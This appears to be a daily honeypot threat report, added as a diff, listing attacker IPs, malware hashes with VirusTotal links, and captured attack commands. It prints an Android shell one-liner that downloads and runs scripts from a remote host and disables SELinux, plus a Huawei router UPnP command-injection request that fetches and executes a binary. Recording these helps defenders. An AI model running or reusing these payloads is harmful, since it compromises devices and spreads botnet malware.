@@ -1,0 +1,36 @@
+Top 5 IPs for 2024-06-16 :
+
+27.74.242.169
+43.163.197.66
+152.228.131.33
+43.153.186.176
+88.250.92.82
+
+Malware Observed:
+
+32e334a9c7936c091e067d7853e5c30c16299c377dab2c5608528f1fcc8f5b79
+https://www.virustotal.com/gui/file/32e334a9c7936c091e067d7853e5c30c16299c377dab2c5608528f1fcc8f5b79
+
+2e64388462cdb9e054c42e0bf5f8b3656223a5920bd5f2bdfc8a85755f59a57f
+https://www.virustotal.com/gui/file/2e64388462cdb9e054c42e0bf5f8b3656223a5920bd5f2bdfc8a85755f59a57f
+
+926c225d5ca2cc42be62413adef4ba94ab092fc01e5fb0be84156d5eeb47e77c
+https://www.virustotal.com/gui/file/926c225d5ca2cc42be62413adef4ba94ab092fc01e5fb0be84156d5eeb47e77c
+
+edca473acc8ead97283ac51911f460e94614db605a81d68de85ca795bbd2fd50
+https://www.virustotal.com/gui/file/edca473acc8ead97283ac51911f460e94614db605a81d68de85ca795bbd2fd50
+
+
+Commands/exploits observed:
+
+
+cd /data/local/tmp/;rm -rf *sh* ; rm -rf *bot.arm* ; rm -rf *bot.ppc* ; rm -rf *bot.x86* ; rm -rf *bot.mips* ;rm -rf *bot.mpsl* ; rm -rf *bot.spc* ; rm -rf *bot.m68k* ; busybox wget http://103.167.88.191/w.sh; sh w.sh; wget http://103.167.88.191/c.sh; sh c.sh; curl http://103.167.88.191/wget.sh; sh wget.sh; su 0 iptables -9; setenforce 0; busybox wget http://103.167.88.191/ahihi || su 0 busybox wget http://103.167.88.191/ahihi; chmod 777 ahihi || su 0 chmod 777 ahihi; sh ahihi; su 0 mv /data/local/tmp /data/local/;su 0 chmod 777 /data/local;su 0 echo hacker /data/local/tmp; su 0 chmod 444 /data/local; ulimit 999999; > %Spawned worker!
+
+
+POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
+Connection: keep-alive
+Accept: */*
+Authorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=00000001, cnonce="248d1a2560100669"
+Content-Length: 453
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$(/bin/busybox wget -g 185.244.36.236 -l /tmp/xxtea -r /hmips; /bin/busybox chmod 777 /tmp/xxtea; /tmp/xxtea huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
